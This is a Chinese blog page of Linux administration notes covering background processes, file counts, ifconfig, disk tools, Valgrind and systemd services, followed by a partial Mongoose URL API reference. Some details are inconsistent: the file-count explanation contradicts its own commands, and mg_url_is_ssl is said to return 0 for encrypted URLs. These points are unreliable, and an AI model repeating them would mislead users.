<h2 id="进程分离到后台"><a href="#进程分离到后台" class="headerlink" title="进程分离到后台"></a>进程分离到后台</h2><p>在 Linux 中，您可以通过多种方式将进程启动并分离到后台运行。下面介绍两种常见的方法：</p>
<ol>
<li><p>使用 “&amp;” 符号：在命令行中启动进程时，可以在命令的末尾添加 “&amp;” 符号。这将使进程在后台运行，而不会阻塞当前终端。例如：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./myprocess &amp;</span><br></pre></td></tr></table></figure>

<p>上述命令将名为 “myprocess” 的可执行文件启动为后台进程。</p>
<p>请注意，当使用该方法启动进程后，终端可能仍然会显示一些输出信息。为了完全将进程与终端分离，可以将进程的标准输入、输出和错误重定向到其他地方，如 <code>/dev/null</code>。例如：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./myprocess &gt; /dev/null 2&gt;&amp;1 &amp;</span><br></pre></td></tr></table></figure>

<p>上述命令将进程的输出和错误都重定向到 <code>/dev/null</code>，这样进程就不会在终端上产生任何输出。</p>
</li>
<li><p>使用 nohup 命令：另一种方法是使用 nohup 命令。nohup 命令可以在后台运行进程，并将其与终端完全分离。使用 nohup 命令的基本语法如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nohup command &amp;</span><br></pre></td></tr></table></figure>

<p>例如，要在后台运行名为 “myprocess” 的可执行文件，可以执行以下命令：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nohup ./myprocess &amp;</span><br></pre></td></tr></table></figure>

<p>使用 nohup 命令启动的进程会将标准输出和标准错误输出重定向到一个名为 “nohup.out” 的文件中。如果您不希望生成 “nohup.out” 文件，可以将输出重定向到 <code>/dev/null</code>，如下所示：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nohup ./myprocess &gt; /dev/null 2&gt;&amp;1 &amp;</span><br></pre></td></tr></table></figure>

<p>这样可以将进程的输出完全丢弃，而不会写入文件。</p>
</li>
</ol>
<p>使用上述方法之一启动进程并将其分离到后台后，您可以关闭终端，进程将继续在后台运行。请注意，分离到后台的进程仍然与父进程（通常是 init 进程）相关联，但不再与当前终端会话相关联。</p>
<hr>
<h2 id="查看目录下的文件数量"><a href="#查看目录下的文件数量" class="headerlink" title="查看目录下的文件数量"></a>查看目录下的文件数量</h2><p>要查看Linux系统中目录下的文件数量，可以使用<code>ls</code>命令结合一些选项和管道操作来实现。下面是一些常用的方法：</p>
<ol>
<li><p>使用<code>ls</code>命令的<code>-l</code>选项来列出目录中的文件详细信息，并将结果通过管道传递给<code>wc</code>命令统计行数。由于<code>ls</code>命令会列出文件和子目录，因此需要减去1来排除目录本身。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">ls</span> -l &lt;directory&gt; | grep <span class="string">&quot;^-&quot;</span> | <span class="built_in">wc</span> -l</span><br></pre></td></tr></table></figure>

<p>将<code>&lt;directory&gt;</code>替换为要查看的目录路径。</p>
</li>
<li><p>使用<code>find</code>命令递归地查找目录下的所有文件，并将结果通过管道传递给<code>wc</code>命令统计行数。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find &lt;directory&gt; -<span class="built_in">type</span> f | <span class="built_in">wc</span> -l</span><br></pre></td></tr></table></figure>

<p>将<code>&lt;directory&gt;</code>替换为要查看的目录路径。</p>
</li>
</ol>
<p>这些方法可以帮助您统计目录下的文件数量。请注意，这些方法只会计算目录中的文件数量，不包括子目录。如果要包括子目录中的文件数量，请使用递归选项。</p>
<p>希望这对您有所帮助。如有其他问题，请随时提问。</p>
<hr>
<h2 id="ifconfig-配置指定网口ip"><a href="#ifconfig-配置指定网口ip" class="headerlink" title="ifconfig 配置指定网口ip"></a>ifconfig 配置指定网口ip</h2><p>要使用<code>ifconfig</code>命令配置指定网口的IP地址，请按照以下步骤操作：</p>
<ol>
<li><p>打开终端并使用root权限或sudo命令切换到管理员身份。</p>
</li>
<li><p>使用以下命令查看当前可用的网络接口列表：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ifconfig -a</span><br></pre></td></tr></table></figure>

<p>在列表中找到您要配置IP地址的网络接口名称。通常以<code>eth0</code>、<code>eth1</code>、<code>enp0sX</code>或类似的形式命名。</p>
</li>
<li><p>使用以下命令设置指定网口的IP地址：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ifconfig &lt;interface&gt; &lt;ip_address&gt; netmask &lt;netmask&gt;</span><br></pre></td></tr></table></figure>

<p>将<code>&lt;interface&gt;</code>替换为您要配置IP地址的网络接口名称，<code>&lt;ip_address&gt;</code>替换为您想要设置的IP地址，<code>&lt;netmask&gt;</code>替换为子网掩码。</p>
<p>例如，如果要将<code>eth0</code>接口的IP地址设置为<code>192.168.0.10</code>，子网掩码为<code>255.255.255.0</code>，则命令如下：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ifconfig eth0 192.168.0.10 netmask 255.255.255.0</span><br></pre></td></tr></table></figure>
</li>
<li><p>验证IP地址是否已成功设置。使用以下命令检查指定网口的IP地址：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ifconfig &lt;interface&gt;</span><br></pre></td></tr></table></figure>

<p>将<code>&lt;interface&gt;</code>替换为您配置IP地址的网络接口名称。</p>
</li>
</ol>
<p>请注意，使用<code>ifconfig</code>命令配置的IP地址是临时的，重启系统后将失效。如果您想要永久配置静态IP地址，请参考之前提供的方法，编辑网络配置文件并应用配置。</p>
<p>希望这对您有所帮助。如有其他问题，请随时提问。</p>
<h2 id="获取磁盘信息"><a href="#获取磁盘信息" class="headerlink" title="获取磁盘信息"></a>获取磁盘信息</h2><p>在Linux中，可以使用一些命令来获取磁盘信息。以下是几个常用的命令：</p>
<ol>
<li><p>df命令：用于显示文件系统的磁盘空间使用情况。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">df -h</span><br></pre></td></tr></table></figure>
<p>该命令将显示每个文件系统的总容量、已使用空间、可用空间以及挂载点。</p>
</li>
<li><p>du命令：用于查看文件和目录的磁盘使用情况。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">du -sh &lt;目录路径&gt;</span><br></pre></td></tr></table></figure>
<p>该命令将显示指定目录的总大小。</p>
</li>
<li><p>lsblk命令：用于列出块设备信息，包括硬盘、分区和挂载点。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lsblk</span><br></pre></td></tr></table></figure>
<p>该命令将显示系统中的块设备列表，包括设备名称、大小、类型等。</p>
</li>
<li><p>fdisk命令：用于查看磁盘分区表信息。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo fdisk -l</span><br></pre></td></tr></table></figure>
<p>该命令将显示系统上的磁盘分区信息，包括磁盘设备名称、分区大小、类型等。</p>
</li>
<li><p>smartctl命令：用于获取硬盘的SMART（自监测、分析和报告技术）信息。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo smartctl -a /dev/sda</span><br></pre></td></tr></table></figure>
<p>该命令将显示指定磁盘的SMART属性和状态信息。</p>
</li>
</ol>
<p>这些命令可以帮助您获取有关磁盘空间、分区、挂载点和硬盘状态的信息。根据您的具体需求，选择适当的命令来获取所需的磁盘信息。</p>
<hr>
<h2 id="valgrind-使用技巧"><a href="#valgrind-使用技巧" class="headerlink" title="valgrind 使用技巧"></a>valgrind 使用技巧</h2><p>当使用 Valgrind 进行代码分析时，以下是一些常用的技巧和建议：</p>
<ol>
<li><p>针对特定问题使用适当的 Valgrind 工具：Valgrind 工具集包含多个工具，如 Memcheck、Cachegrind、Massif 等，每个工具都有不同的功能和用途。根据你要解决的具体问题，选择适合的工具进行分析。</p>
</li>
<li><p>使用合适的选项和参数：Valgrind 提供了多种选项和参数来控制分析的行为。根据你的需求，设置合适的选项，如内存泄漏检查、调试服务器、堆栈跟踪等。阅读 Valgrind 的文档以了解可用选项和参数，并根据实际情况进行设置。</p>
</li>
<li><p>关注 Valgrind 的警告和报告：Valgrind 会生成警告和报告，指示可能存在的内存错误、泄漏、未初始化变量等问题。仔细阅读和理解这些报告，并根据提示进行代码的修复和优化。</p>
</li>
<li><p>使用 Valgrind 工具的辅助工具：Valgrind 提供了一些辅助工具，如 <code>ms_print</code>（用于分析 Massif 输出）、<code>callgrind_annotate</code>（用于分析 Callgrind 输出）等。使用这些工具可以更好地可视化和分析 Valgrind 的结果。</p>
</li>
<li><p>分析程序的热点代码：通过查看 Valgrind 的报告和分析结果，识别程序中的热点代码，即执行次数多、内存占用高或性能消耗大的代码段。针对这些热点代码进行优化，可以显著改善程序的性能和资源使用情况。</p>
</li>
<li><p>结合调试器使用：Valgrind 和调试器（如 GDB）可以一起使用，以深入分析程序的问题。你可以在 Valgrind 报告中找到有关内存错误和泄漏的信息，然后使用调试器定位具体的代码位置并进行调试。</p>
</li>
<li><p>针对大型程序进行分析：对于大型程序，Valgrind 的分析可能会耗费较长时间和大量内存。在这种情况下，可以使用 Valgrind 的部分功能，如 <code>--tool=memcheck --leak-check=no</code>，只对内存错误进行检查，以加快分析速度。</p>
</li>
<li><p>测试不同的输入数据和场景：Valgrind 的分析结果可能会受到不同的输入数据和场景的影响。尝试使用不同的测试数据和场景来验证程序的内存安全性和性能，以充分覆盖各种情况。</p>
</li>
</ol>
<p>最重要的是，要仔细阅读 Valgrind 的文档，理解各个工具的原理和用法，并根据</p>
<p>实际情况灵活应用。同时，要结合其他调试和性能分析工具，以获取更全面的代码分析和优化结果。</p>
<h2 id="valgrind-结果输出到文件"><a href="#valgrind-结果输出到文件" class="headerlink" title="valgrind 结果输出到文件"></a>valgrind 结果输出到文件</h2><p>要将 Valgrind 的结果输出到文件中，可以使用重定向操作符（<code>&gt;</code>）将 Valgrind 的输出重定向到一个文件。下面是一个示例：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">valgrind --tool=memcheck ./my_program &gt; valgrind_output.txt</span><br></pre></td></tr></table></figure>

<p>在上述示例中，<code>valgrind_output.txt</code> 是要保存 Valgrind 输出的文件名。运行命令后，Valgrind 的输出将会写入该文件中，而不会显示在终端上。</p>
<p>如果你想要将标准错误（stderr）也输出到文件中，可以使用 <code>2&gt;&amp;1</code> 重定向标准错误到标准输出，然后再重定向到文件中。示例如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">valgrind --tool=memcheck ./my_program &gt; valgrind_output.txt 2&gt;&amp;1</span><br></pre></td></tr></table></figure>

<p>在这个示例中，<code>2&gt;&amp;1</code> 将标准错误重定向到标准输出，然后将标准输出和标准错误都重定向到 <code>valgrind_output.txt</code> 文件中。</p>
<p>通过将 Valgrind 输出到文件中，你可以随时打开文件来查看和分析 Valgrind 的结果，以便更好地理解和解决程序中的内存错误和问题。</p>
<h2 id="Linux-systemctl-删除服务"><a href="#Linux-systemctl-删除服务" class="headerlink" title="Linux systemctl 删除服务"></a>Linux systemctl 删除服务</h2><p>要从 Systemd 中删除服务条目（service），可以按照以下步骤进行操作：</p>
<ol>
<li>停止服务：<br>在删除服务之前，首先需要停止该服务。使用以下命令停止服务：</li>
</ol>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> systemctl stop servicename</span><br></pre></td></tr></table></figure>

<p>请将 <code>servicename</code> 替换为你要删除的服务的名称。</p>
<ol start="2">
<li>禁用服务：<br>使用以下命令禁用服务，以确保在系统启动时不会自动启动该服务：</li>
</ol>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> systemctl <span class="built_in">disable</span> servicename</span><br></pre></td></tr></table></figure>

<ol start="3">
<li>删除服务文件：<br>服务文件通常位于 <code>/etc/systemd/system/</code> 或 <code>/usr/lib/systemd/system/</code> 目录中，具体取决于你的 Linux 发行版和配置。使用以下命令删除服务文件：</li>
</ol>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> <span class="built_in">rm</span> /etc/systemd/system/servicename.service</span><br></pre></td></tr></table></figure>

<p>请确保将 <code>servicename.service</code> 替换为你要删除的服务文件的实际名称。</p>
<ol start="4">
<li>重新加载 Systemd 配置：<br>删除服务文件后，需要重新加载 Systemd 配置，以确保系统知道该服务已被删除。使用以下命令重新加载配置：</li>
</ol>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> systemctl daemon-reload</span><br></pre></td></tr></table></figure>

<p>完成上述步骤后，服务条目就会从 Systemd 中彻底删除。</p>
<p>请注意，在执行这些操作时要谨慎，确保你要删除的是正确的服务条目，并备份相关文件以防需要恢复。</p>
<hr>
<h2 id="Linux-自启动脚本-详解"><a href="#Linux-自启动脚本-详解" class="headerlink" title="Linux 自启动脚本 详解"></a>Linux 自启动脚本 详解</h2><p>在 Linux 系统中，可以使用不同的方法设置自启动脚本，具体取决于你所使用的 Linux 发行版和 init 系统。</p>
<p>在大多数现代 Linux 发行版中，常见的 init 系统是 Systemd。下面是使用 Systemd 设置自启动脚本的步骤：</p>
<ol>
<li>编写启动脚本：<br>在 Linux 系统上创建你的自启动脚本。脚本可以是 Bash 脚本或其他可执行脚本。确保脚本具有可执行权限。</li>
</ol>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 你的启动脚本命令</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;System is starting. Do something here...&quot;</span></span><br></pre></td></tr></table></figure>

<ol start="2">
<li>将脚本放置到适当的位置：<br>将脚本复制到一个适当的位置，以便系统可以找到它。通常，可以将自启动脚本放置在 <code>/etc/init.d/</code> 或 <code>/etc/systemd/system/</code> 目录中。</li>
</ol>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> <span class="built_in">cp</span> my_startup.sh /etc/systemd/system/</span><br></pre></td></tr></table></figure>

<ol start="3">
<li>创建 Systemd 服务单元文件：<br>在 Systemd 的服务单元目录中创建一个文件，并添加以下内容：</li>
</ol>
<figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">[Unit]</span></span><br><span class="line"><span class="attr">Description</span>=My Startup Script</span><br><span class="line"></span><br><span class="line"><span class="section">[Service]</span></span><br><span class="line"><span class="attr">ExecStart</span>=/path/to/my_startup.sh</span><br><span class="line"></span><br><span class="line"><span class="section">[Install]</span></span><br><span class="line"><span class="attr">WantedBy</span>=multi-user.target</span><br></pre></td></tr></table></figure>

<p>在上面的配置中：</p>
<ul>
<li><code>Description</code>：描述此服务的信息。</li>
<li><code>ExecStart</code>：指定要执行的启动脚本的路径。</li>
</ul>
<ol start="4">
<li>重新加载 Systemd：<br>在创建或修改 Systemd 服务单元文件后，需要重新加载 Systemd 配置。</li>
</ol>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> systemctl daemon-reload</span><br></pre></td></tr></table></figure>

<ol start="5">
<li>启用服务：<br>将刚刚创建的服务设置为自启动。</li>
</ol>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> systemctl <span class="built_in">enable</span> my_startup.service</span><br></pre></td></tr></table></figure>

<p>现在，你的启动脚本 <code>my_startup.sh</code> 将在系统启动时自动执行。可以通过重启系统来测试自启动脚本是否正常工作。</p>
<p>请注意，不同的 Linux 发行版和 init 系统可能有所不同。如果你使用的是其他 init 系统（如 SysV init），则需要使用不同的方法来设置自启动脚本。建议查阅所使用 Linux 发行版的文档以获取更详细的指导。</p>
<hr>
<h2 id="ubuntu20-自启动脚本"><a href="#ubuntu20-自启动脚本" class="headerlink" title="ubuntu20 自启动脚本"></a>ubuntu20 自启动脚本</h2><p>在 Ubuntu 20.04 中，你可以使用 Systemd 来设置自启动脚本。Systemd 是一个系统和服务管理器，可以用于配置和管理系统上运行的服务、进程和自启动脚本。</p>
<p>以下是在 Ubuntu 20.04 中设置自启动脚本的步骤：</p>
<ol>
<li>编写启动脚本：<br>在 Ubuntu 20.04 上创建你的自启动脚本。比如，你可以在 <code>/usr/local/bin/</code> 目录下创建一个名为 <code>my_startup.sh</code> 的脚本。</li>
</ol>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 你的启动脚本命令</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;System is starting. Do something here...&quot;</span></span><br></pre></td></tr></table></figure>

<ol start="2">
<li>设置脚本权限：<br>确保脚本具有可执行权限。</li>
</ol>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">chmod</span> +x /usr/local/bin/my_startup.sh</span><br></pre></td></tr></table></figure>

<ol start="3">
<li>创建 Systemd 服务单元文件：<br>在 <code>/etc/systemd/system/</code> 目录下，创建一个名为 <code>my_startup.service</code> 的文件，并添加以下内容：</li>
</ol>
<figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">[Unit]</span></span><br><span class="line"><span class="attr">Description</span>=My Startup Script</span><br><span class="line"></span><br><span class="line"><span class="section">[Service]</span></span><br><span class="line"><span class="attr">Type</span>=simple</span><br><span class="line"><span class="attr">ExecStart</span>=/usr/local/bin/my_startup.sh</span><br><span class="line"></span><br><span class="line"><span class="section">[Install]</span></span><br><span class="line"><span class="attr">WantedBy</span>=multi-user.target</span><br></pre></td></tr></table></figure>

<p>在上面的配置中：</p>
<ul>
<li><code>Description</code>：描述此服务的信息。</li>
<li><code>ExecStart</code>：指定要执行的启动脚本的路径。</li>
</ul>
<ol start="4">
<li>重新加载 Systemd：<br>在创建或修改 Systemd 服务单元文件后，需要重新加载 Systemd 配置。</li>
</ol>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> systemctl daemon-reload</span><br></pre></td></tr></table></figure>

<ol start="5">
<li>启用服务：<br>将刚刚创建的服务设置为自启动。</li>
</ol>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> systemctl <span class="built_in">enable</span> my_startup.service</span><br></pre></td></tr></table></figure>

<p>现在，你的启动脚本 <code>my_startup.sh</code> 将在系统启动时自动执行。可以通过重启系统来测试自启动脚本是否正常工作。</p>
<p>请确保在编写脚本和配置 Systemd 服务单元文件时，路径和权限设置都是正确的。这样就能够确保你的自启动脚本在系统启动时可靠地执行。</p>
<hr>
<h2 id="重启系统"><a href="#重启系统" class="headerlink" title="重启系统"></a>重启系统</h2><p>在 <code>systemd</code> 下，可以使用 <code>systemctl</code> 命令来执行与重启系统相关的操作。以下是一些常用的 <code>systemctl</code> 命令及其说明：</p>
<ol>
<li><p><code>reboot</code>：用于重启系统。执行此命令会向系统发送重启信号，导致系统重新启动。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo systemctl reboot</span><br></pre></td></tr></table></figure>
</li>
<li><p><code>poweroff</code>：用于关闭系统。执行此命令会向系统发送关闭信号，导致系统完全关闭。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo systemctl poweroff</span><br></pre></td></tr></table></figure>
</li>
<li><p><code>halt</code>：用于停止系统。执行此命令会向系统发送停止信号，导致系统停止运行。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo systemctl halt</span><br></pre></td></tr></table></figure>
</li>
<li><p><code>suspend</code>：用于挂起系统。执行此命令会将系统置于挂起状态，节省电源但保留系统状态。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo systemctl suspend</span><br></pre></td></tr></table></figure>
</li>
<li><p><code>hibernate</code>：用于休眠系统。执行此命令会将系统置于休眠状态，将内存中的内容保存到磁盘，以便稍后恢复。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo systemctl hibernate</span><br></pre></td></tr></table></figure></li>
</ol>
<p>需要注意的是，执行上述命令通常需要超级用户权限（使用 <code>sudo</code> 或以 <code>root</code> 用户身份运行）。</p>
<p>此外，还可以使用 <code>shutdown</code> 命令来执行系统重启操作，该命令提供了更多选项和参数以灵活控制系统的行为。</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="https://junyiha.github.io/2024/05/22/notebook/Mongoose/mongoose_1_%E5%AE%98%E6%96%B9%E6%96%87%E6%A1%A3/2024-05-22-mongoose_url/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="zhang junyi">
      <meta itemprop="description" content="工作学习笔记">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="junyi's blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2024/05/22/notebook/Mongoose/mongoose_1_%E5%AE%98%E6%96%B9%E6%96%87%E6%A1%A3/2024-05-22-mongoose_url/" class="post-title-link" itemprop="url">mongoose_url</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2024-05-22 09:00:00" itemprop="dateCreated datePublished" datetime="2024-05-22T09:00:00+08:00">2024-05-22</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2025-04-28 16:08:39" itemprop="dateModified" datetime="2025-04-28T16:08:39+08:00">2025-04-28</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Mongoose/" itemprop="url" rel="index"><span itemprop="name">Mongoose</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><ul>
<li>mongoose关于URL的函数</li>
</ul>
<h2 id="mg-url-port"><a href="#mg-url-port" class="headerlink" title="mg_url_port"></a>mg_url_port</h2><ul>
<li><p>简介：</p>
<ul>
<li>根据给定的URL返回端口</li>
</ul>
</li>
<li><p>原型：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">unsigned</span> <span class="type">short</span> <span class="title">mg_url_port</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *url)</span></span>;</span><br></pre></td></tr></table></figure>
</li>
<li><p>参数：</p>
<ul>
<li>url – 需要提取端口号的URL</li>
</ul>
</li>
<li><p>返回值：</p>
<ul>
<li>成功，返回给定URL的端口号</li>
<li>失败，如果URL不包含端口并且URL协议没有默认端口，则为0</li>
</ul>
</li>
<li><p>示例：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> <span class="type">short</span> port1 = <span class="built_in">mg_url_port</span>(<span class="string">&quot;https://myhost.com&quot;</span>) <span class="comment">// port1 is now 443 (default https port)</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">short</span> port2 = <span class="built_in">mg_url_port</span>(<span class="string">&quot;127.0.0.1:567&quot;</span>) <span class="comment">// port2 is now 567</span></span><br></pre></td></tr></table></figure></li>
</ul>
<h2 id="mg-url-is-ssl"><a href="#mg-url-is-ssl" class="headerlink" title="mg_url_is_ssl"></a>mg_url_is_ssl</h2><ul>
<li><p>简介：</p>
<ul>
<li>检查给定的URL是否使用加密方案</li>
</ul>
</li>
<li><p>原型：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">mg_url_is_ssl</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *url)</span></span>;</span><br></pre></td></tr></table></figure>
</li>
<li><p>参数：</p>
<ul>
<li>url – 需要检查的URL</li>
</ul>
</li>
<li><p>返回值：</p>
<ul>
<li>如果URL使用了加密方案，返回0</li>
<li>如果没有，则返回非0</li>
</ul>
</li>
<li><p>示例：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="built_in">mg_url_is_ssl</span>(<span class="string">&quot;https://example.org&quot;</span>) == <span class="number">0</span>) &#123;</span><br><span class="line">  <span class="comment">// scheme is encrypted</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ul>
<h2 id="mg-url-host"><a href="#mg-url-host" class="headerlink" title="mg_url_host"></a>mg_url_host</h2><ul>
<li><p>简介：</p>
<ul>
<li>从给定的URL中提取主机名。</li>
</ul>
</li>
<li><p>原型：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">mg_str</span> <span class="built_in">mg_url_host</span>(<span class="type">const</span> <span class="type">char</span> *url);</span><br></pre></td></tr></table></figure>
</li>
<li><p>参数：</p>
<ul>
<li>url – 一个URL字符串</li>
</ul>
</li>
<li><p>返回值：</p>
<ul>
<li>主机名</li>
</ul>
</li>
<li><p>示例：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">mg_str</span> a = <span class="built_in">mg_url_host</span>(<span class="string">&quot;https://my.example.org:1234&quot;</span>); <span class="comment">// a == &quot;my.example.org&quot;</span></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">mg_str</span> b = <span class="built_in">mg_url_host</span>(<span class="string">&quot;tcp://[::1]&quot;</span>); <span class="comment">// b == &quot;[::1]&quot;</span></span><br></pre></td></tr></table></figure></li>
</ul>
<h2 id="mg-url-user"><a href="#mg-url-user" class="headerlink" title="mg_url_user"></a>mg_url_user</h2><ul>
<li><p>简介：</p>
<ul>
<li>从给定的URL中提取用户名。</li>
</ul>
</li>
<li><p>原型：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">mg_str</span> <span class="built_in">mg_url_user</span>(<span class="type">const</span> <span class="type">char</span> *url);</span><br></pre></td></tr></table></figure>
</li>
<li><p>参数：</p>
<ul>
<li>url – 需要提取用户名的URL</li>
</ul>
</li>
<li><p>返回值：</p>
<ul>
<li>成功，返回用户名</li>
<li>失败，返回空的字符串</li>
</ul>
</li>
<li><p>示例：</p>
